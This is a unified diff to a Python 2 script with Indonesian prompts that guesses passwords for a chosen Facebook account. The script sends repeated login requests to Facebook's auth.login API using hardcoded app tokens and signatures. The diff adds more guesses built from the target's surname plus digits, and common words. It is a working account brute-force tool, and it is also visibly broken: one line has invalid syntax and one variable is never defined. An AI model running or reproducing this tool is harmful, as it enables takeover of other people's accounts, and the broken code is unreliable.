@@ -48,9 +48,9 @@ def brutefor():
 
         else:
                 print
-                print " ===================================="
+                print " ======================================"
                 target = raw_input(" [#] Masukan ID Target: ")
-                print " ===================================="
+                print " ======================================"
                 urldev = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
                 jsl = json.loads(urldev.text)
 
@@ -90,7 +90,7 @@ def brutefor():
                                         elif "www.facebook.com" in js["error_msg"]:
                                                 print " Cekpoint : " + san4
                                         else:
-                                                san5 = "sayang"
+                                                san5 = jsl["last_name"] + "123"
                                                 print " [+] " + san5
                                                 dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 js = json.load(dev)
@@ -99,7 +99,58 @@ def brutefor():
                                                 elif "www.facebook.com" in js["error_msg"]:
                                                         print " Cekpoint : " + san5
                                                 else:
-                                                        print " Tak Ada Yg Cocok.."
+                                                        san6 = jsl["last_name"] + "12345"
+                                                        print " [+] " + san6
+                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                        js = json.load(dev)
+                                                        if "access_token" in js:
+                                                                print "  Found : " + san6
+                                                        else "www.facebook.com" in js["error_msg"]:
+                                                                print "  Cekpoint : " + san6
+                                                        else:
+                                                                san7 = jsl["last_name"] + "321"
+                                                                print " [+] " + san7
+                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                js = json.load(dev)
+                                                                if "access_token" in js:
+                                                                        print "  Found : " + san7
+                                                                elif "www.facebook.com" in js["error_msg"]:
+                                                                        print "  Cekpoint : " + san7
+                                                                else:
+                                                                        san8 = jsl["last_name"] + "54321"
+                                                                        print " [+] " + san8
+                                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                        js = json.load(dev)
+                                                                        if "access_token" in js:
+                                                                                print "  Found : " + san8
+                                                                        elif "www.facebook.com" in js["error_msg"]:
+                                                                                print "  Cekpoint : " + san8
+                                                                        else:
+                                                                                san9 = "sayang"
+                                                                                print " [+] " + san9
+                                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                js = json.load(dev)
+                                                                                if "access_token" in js:
+                                                                                        print "  Found : " + san9
+                                                                                elif "www.facebook.com" in js["error_msg"]:
+                                                                                        print "  Cekpoint : " + san9
+                                                                                else:
+                                                                                        san8 = "doraemon"
+                                                                                        print " [+] " + san10
+                                                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                        js = json.load(dev)
+                                                                                        if "access_token" in js:
+                                                                                                print "  Found : " + san10
+                                                                                        elif "www.facebook.com" in js["error_msg"]:
+                                                                                                print "  Cekpoint : " + san10
+                                                                                        else:
+                                                                                                print 
+                                                                                                print "  Gagalll..."
+                                                                                                print " ==============================="
+
+                                                                        
+
+
 
 def main():
         login()
